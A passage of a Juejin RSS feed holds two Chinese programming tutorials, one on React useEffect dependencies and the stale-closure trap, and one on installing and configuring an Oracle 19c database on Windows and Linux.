content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            永远不要欺骗 React：详解 useEffect 依赖规则与“闭包陷阱”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    皮蛋小精灵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:50:47.000Z" title="Fri Dec 05 2025 02:50:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果你在 <code>useEffect</code> 内部使用了某个 prop 或 state，但没有把它放到依赖数组里，你会遇到 React 中最著名的 Bug —— <strong>闭包陷阱 (Stale Closure)</strong> 。</p>
<p>这意味着：<strong>你的 Effect 只能“看见”旧的数据，永远看不见新的数据。</strong></p>
<hr/>
<h3 data-id="heading-0">1. 为什么“必须”放？(原理演示)</h3>
<p>看这个经典的错误例子：</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// ❌ 永远打印 0</span>
    }, <span class="hljs-number">1000</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(id);
  }, []); <span class="hljs-comment">// ⚠️ 空数组：意思是“只在挂载时运行一次”</span>
}
</code></pre>
<p><strong>发生了什么？</strong></p>
<ol>
<li><strong>第一次渲染 (Mount):</strong> <code>count</code> 是 0。<code>useEffect</code> 执行，创建了一个定时器。这个定时器捕获了<strong>当时</strong>的 <code>count</code> (也就是 0)。</li>
<li><strong>第二次渲染:</strong> 用户点了按钮，<code>count</code> 变成了 1。</li>
<li><strong>React 检查依赖:</strong> 依赖数组是 <code>[]</code> (空的)，跟上次一样。</li>
<li><strong>React 决定:</strong> “既然依赖没变，那我就不重新运行 Effect 了。”</li>
<li><strong>结果:</strong> 旧的定时器还在跑，它手里的 <code>count</code> <strong>依然是第一次渲染时的那个 0</strong>。它永远不知道外面 <code>count</code> 已经变了。</li>
</ol>
<p><strong>这就是“对 React 撒谎”的代价。</strong></p>
<hr/>
<h3 data-id="heading-1">2. 但是，如果你把它们放进去...</h3>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);
  }, <span class="hljs-number">1000</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(id);
}, [count]); <span class="hljs-comment">// ✅ 加进去了</span>
</code></pre>
<p><strong>现在的行为：</strong></p>
<ol>
<li><code>count</code> 变了 (0 -&gt; 1)。</li>
<li>React 发现依赖变了。</li>
<li><strong>清除</strong>旧的定时器。</li>
<li><strong>运行</strong>新的 Effect，创建新的定时器（捕获新的 <code>count</code> 1）。</li>
</ol>
<p><strong>问题来了：</strong> 定时器被不断重置，这可能不是你想要的（比如会导致计时不准）。</p>
<hr/>
<h3 data-id="heading-2">3. 如何“既不撒谎，又不重置”？</h3>
<p>可以使用 <code>useRef</code> 和 <code>useEffectEvent</code>。这两个工具存在的意义，就是为了<strong>合法地</strong>把变量从依赖数组里拿出来。</p>
<h4 data-id="heading-3">方法 A：使用函数式更新 (如果是 setState)</h4>
<p>如果你只是想修改状态，不需要读取它：</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ✅ 不需要依赖 count，因为 prev 永远是 React 传给你的最新值</span>
    <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>); 
  }, <span class="hljs-number">1000</span>);
}, []); <span class="hljs-comment">// ✅ 空数组是安全的</span>
</code></pre>
<h4 data-id="heading-4">方法 B：使用 <code>useRef</code> (逃生舱)</h4>
<p>如果你需要读取值，但不想触发 Effect 重跑：</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(count);
<span class="hljs-comment">// 每次渲染都同步最新值</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> { countRef.<span class="hljs-property">current</span> = count });

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ✅ 读 ref，永远是最新的，且 ref 不需要放进依赖</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(countRef.<span class="hljs-property">current</span>); 
  }, <span class="hljs-number">1000</span>);
}, []); <span class="hljs-comment">// ✅ 安全</span>
</code></pre>
<h4 data-id="heading-5">方法 C：使用 <code>useEffectEvent</code> (最新标准)</h4>
<p>我们在上一个问题里用到的方法：</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> onTick = <span class="hljs-title function_">useEffectEvent</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// ✅ 在这里读最新值</span>
});

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">onTick</span>();
  }, <span class="hljs-number">1000</span>);
}, []); <span class="hljs-comment">// ✅ 安全</span>
</code></pre>
<h3 data-id="heading-6">总结</h3>
<ol>
<li>
<p><strong>官方规则 (ESLint)：</strong> 凡是用到的响应式数据（props, state, context），<strong>必须</strong>全部填入依赖数组。<strong>不要试图通过欺骗 linter (<code>// eslint-disable</code>) 来解决逻辑问题。</strong></p>
</li>
<li>
<p><strong>后果：</strong> 如果不填，代码会引用旧值（闭包陷阱）。</p>
</li>
<li>
<p><strong>正确做法：</strong> 如果你不希望某个变量导致 Effect 重新运行，<strong>不要简单地把它从数组里删掉</strong>，而是应该：</p>
<ul>
<li>用 <code>useRef</code> 把它包起来。</li>
<li>或者用 <code>useEffectEvent</code> 把它隔离开。</li>
<li>或者检查是否可以移出 Effect。</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Oracle入门到删库跑路-02】基础入门：Oracle安装与配置]]></title>    <link>https://juejin.cn/post/7579887768227561506</link>    <guid>https://juejin.cn/post/7579887768227561506</guid>    <pubDate>2025-12-05T02:48:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579887768227561506" data-draft-id="7579887768227495970" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Oracle入门到删库跑路-02】基础入门：Oracle安装与配置"/> <meta itemprop="keywords" content="数据库,Oracle"/> <meta itemprop="datePublished" content="2025-12-05T02:48:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="零日失眠者"/> <meta itemprop="url" content="https://juejin.cn/user/3411111810444068"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Oracle入门到删库跑路-02】基础入门：Oracle安装与配置
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411111810444068/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    零日失眠者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:48:56.000Z" title="Fri Dec 05 2025 02:48:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">系统要求和准备工作</h2>
<p>在安装Oracle数据库之前，需要确保系统满足最低硬件和软件要求。</p>
<h3 data-id="heading-1">硬件要求</h3>
<ol>
<li><strong>内存</strong>：至少4GB RAM（推荐8GB或更高）</li>
<li><strong>磁盘空间</strong>：
<ul>
<li>企业版：至少6.5GB</li>
<li>标准版：至少6GB</li>
<li>临时安装空间：1GB</li>
</ul>
</li>
<li><strong>显示器</strong>：1024×768分辨率或更高</li>
</ol>
<h3 data-id="heading-2">软件要求</h3>
<ol>
<li><strong>操作系统</strong>：
<ul>
<li>Windows Server 2016/2019/2022</li>
<li>Red Hat Enterprise Linux 7/8</li>
<li>Oracle Linux 7/8</li>
<li>SUSE Linux Enterprise Server 12/15</li>
</ul>
</li>
<li><strong>内核参数</strong>（Linux）：
<ul>
<li>semmsl=250</li>
<li>semmns=32000</li>
<li>semopm=100</li>
<li>semmni=128</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">安装前准备</h3>
<ol>
<li>创建专用的Oracle用户和组</li>
<li>配置系统环境变量</li>
<li>关闭防火墙和杀毒软件（临时）</li>
<li>下载Oracle安装介质</li>
</ol>
<h2 data-id="heading-4">2.2 Windows环境下Oracle安装</h2>
<h3 data-id="heading-5">安装步骤</h3>
<ol>
<li>
<p><strong>解压安装文件</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 解压下载的zip文件到指定目录</span>
</code></pre>
</li>
<li>
<p><strong>运行安装程序</strong></p>
<ul>
<li>以管理员身份运行setup.exe</li>
<li>选择"创建和配置数据库"</li>
</ul>
</li>
<li>
<p><strong>配置安全更新</strong></p>
<ul>
<li>可选择跳过更新注册</li>
</ul>
</li>
<li>
<p><strong>选择安装选项</strong></p>
<ul>
<li>创建和配置数据库</li>
<li>系统类：桌面类或服务器类</li>
</ul>
</li>
<li>
<p><strong>典型安装配置</strong></p>
<ul>
<li>Oracle基目录：C:\app\username</li>
<li>数据库文件位置：C:\app\username\product\version\dbhome</li>
<li>全局数据库名：orcl</li>
<li>管理员密码：设置SYS和SYSTEM用户密码</li>
</ul>
</li>
<li>
<p><strong>先决条件检查</strong></p>
<ul>
<li>系统会自动检查环境</li>
<li>如有问题需要解决后再继续</li>
</ul>
</li>
<li>
<p><strong>概要信息</strong></p>
<ul>
<li>确认安装配置信息</li>
<li>点击"完成"开始安装</li>
</ul>
</li>
<li>
<p><strong>安装进度</strong></p>
<ul>
<li>等待安装过程完成</li>
<li>自动执行配置脚本</li>
</ul>
</li>
</ol>
<h3 data-id="heading-6">安装后验证</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 连接到数据库验证安装</span>
sqlplus <span class="hljs-operator">/</span> <span class="hljs-keyword">as</span> sysdba

<span class="hljs-comment">-- 查看数据库状态</span>
<span class="hljs-keyword">SELECT</span> status <span class="hljs-keyword">FROM</span> v$instance;

<span class="hljs-comment">-- 查看数据库版本</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> v$version;
</code></pre>
<h2 data-id="heading-7">2.3 Linux环境下Oracle安装</h2>
<h3 data-id="heading-8">系统配置</h3>
<ol>
<li>
<p><strong>创建用户和组</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建oinstall组</span>
groupadd oinstall

<span class="hljs-comment"># 创建dba组</span>
groupadd dba

<span class="hljs-comment"># 创建oracle用户</span>
useradd -g oinstall -G dba oracle

<span class="hljs-comment"># 设置密码</span>
passwd oracle
</code></pre>
</li>
<li>
<p><strong>配置内核参数</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑/etc/sysctl.conf文件</span>
vi /etc/sysctl.conf

<span class="hljs-comment"># 添加以下参数</span>
kernel.shmall = 2097152
kernel.shmmax = 4294967295
kernel.shmmni = 4096
kernel.sem = 250 32000 100 128
fs.file-max = 6815744
fs.aio-max-nr = 1048576
net.ipv4.ip_local_port_range = 9000 65500
net.core.rmem_default = 262144
net.core.rmem_max = 4194304
net.core.wmem_default = 262144
net.core.wmem_max = 1048576
</code></pre>
</li>
<li>
<p><strong>应用内核参数</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使配置生效</span>
/sbin/sysctl -p
</code></pre>
</li>
</ol>
<h3 data-id="heading-9">安装步骤</h3>
<ol>
<li>
<p><strong>解压安装文件</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 切换到oracle用户</span>
su - oracle

<span class="hljs-comment"># 解压安装文件</span>
unzip linuxamd64_19c_database.zip
</code></pre>
</li>
<li>
<p><strong>运行安装程序</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 进入安装目录</span>
<span class="hljs-built_in">cd</span> database

<span class="hljs-comment"># 运行安装程序</span>
./runInstaller
</code></pre>
</li>
<li>
<p><strong>图形化安装界面</strong></p>
<ul>
<li>选择"创建和配置数据库"</li>
<li>选择"桌面类"或"服务器类"</li>
<li>配置Oracle基目录和软件位置</li>
<li>设置数据库标识符和密码</li>
<li>执行先决条件检查</li>
<li>确认配置并开始安装</li>
</ul>
</li>
<li>
<p><strong>执行配置脚本</strong></p>
<ul>
<li>安装完成后，以root用户执行提示的脚本</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 以root身份执行</span>
/oraInventory/orainstRoot.sh
/u01/app/oracle/product/19.0.0/dbhome_1/root.sh
</code></pre>
</li>
</ol>
<h2 data-id="heading-10">2.4 数据库创建和配置</h2>
<h3 data-id="heading-11">使用DBCA创建数据库</h3>
<ol>
<li>
<p><strong>启动DBCA</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在命令行中运行</span>
dbca
</code></pre>
</li>
<li>
<p><strong>创建数据库向导</strong></p>
<ul>
<li>选择"创建数据库"</li>
<li>选择"高级配置"</li>
<li>输入全局数据库名和SID</li>
<li>选择数据库模板（通用或数据仓库）</li>
</ul>
</li>
<li>
<p><strong>配置数据库选项</strong></p>
<ul>
<li>启用企业管理器</li>
<li>配置字符集（推荐AL32UTF8）</li>
<li>设置管理员密码</li>
</ul>
</li>
<li>
<p><strong>存储配置</strong></p>
<ul>
<li>选择文件系统或ASM存储</li>
<li>配置快速恢复区</li>
</ul>
</li>
<li>
<p><strong>初始化参数</strong></p>
<ul>
<li>内存管理选项</li>
<li>进程数配置</li>
<li>字符集设置</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">手动创建数据库</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 设置环境变量</span>
export ORACLE_SID<span class="hljs-operator">=</span>orcl

<span class="hljs-comment">-- 2. 启动实例到nomount状态</span>
sqlplus <span class="hljs-operator">/</span> <span class="hljs-keyword">as</span> sysdba
STARTUP NOMOUNT

<span class="hljs-comment">-- 3. 创建数据库</span>
<span class="hljs-keyword">CREATE</span> DATABASE orcl
   <span class="hljs-keyword">USER</span> SYS IDENTIFIED <span class="hljs-keyword">BY</span> password
   <span class="hljs-keyword">USER</span> <span class="hljs-keyword">SYSTEM</span> IDENTIFIED <span class="hljs-keyword">BY</span> password
   LOGFILE <span class="hljs-keyword">GROUP</span> <span class="hljs-number">1</span> (<span class="hljs-string">'/u01/app/oracle/oradata/orcl/redo01.log'</span>) SIZE <span class="hljs-number">100</span>M,
           <span class="hljs-keyword">GROUP</span> <span class="hljs-number">2</span> (<span class="hljs-string">'/u01/app/oracle/oradata/orcl/redo02.log'</span>) SIZE <span class="hljs-number">100</span>M,
           <span class="hljs-keyword">GROUP</span> <span class="hljs-number">3</span> (<span class="hljs-string">'/u01/app/oracle/oradata/orcl/redo03.log'</span>) SIZE <span class="hljs-number">100</span>M
   MAXLOGFILES <span class="hljs-number">5</span>
   MAXLOGMEMBERS <span class="hljs-number">5</span>
   MAXLOGHISTORY <span class="hljs-number">1</span>
   MAXDATAFILES <span class="hljs-number">100</span>
   <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> AL32UTF8
   <span class="hljs-type">NATIONAL</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> AL16UTF16
   EXTENT MANAGEMENT <span class="hljs-keyword">LOCAL</span>
   DATAFILE <span class="hljs-string">'/u01/app/oracle/oradata/orcl/system01.dbf'</span>
     SIZE <span class="hljs-number">325</span>M REUSE
   SYSAUX DATAFILE <span class="hljs-string">'/u01/app/oracle/oradata/orcl/sysaux01.dbf'</span>
     SIZE <span class="hljs-number">325</span>M REUSE
   <span class="hljs-keyword">DEFAULT</span> TABLESPACE users
     DATAFILE <span class="hljs-string">'/u01/app/oracle/oradata/orcl/users01.dbf'</span>
     SIZE <span class="hljs-number">20</span>M REUSE
   <span class="hljs-keyword">DEFAULT</span> TEMPORARY TABLESPACE temp
     TEMPFILE <span class="hljs-string">'/u01/app/oracle/oradata/orcl/temp01.dbf'</span>
     SIZE <span class="hljs-number">20</span>M REUSE
   UNDO TABLESPACE undotbs1
     DATAFILE <span class="hljs-string">'/u01/app/oracle/oradata/orcl/undotbs01.dbf'</span>
     SIZE <span class="hljs-number">200</span>M REUSE;

<span class="hljs-comment">-- 4. 运行脚本创建数据字典</span>
@$ORACLE_HOME<span class="hljs-operator">/</span>rdbms<span class="hljs-operator">/</span>admin<span class="hljs-operator">/</span>catalog.sql
@$ORACLE_HOME<span class="hljs-operator">/</span>rdbms<span class="hljs-operator">/</span>admin<span class="hljs-operator">/</span>catproc.sql
@$ORACLE_HOME<span class="hljs-operator">/</span>sqlplus<span class="hljs-operator">/</span>admin<span class="hljs-operator">/</span>pupbld.sql
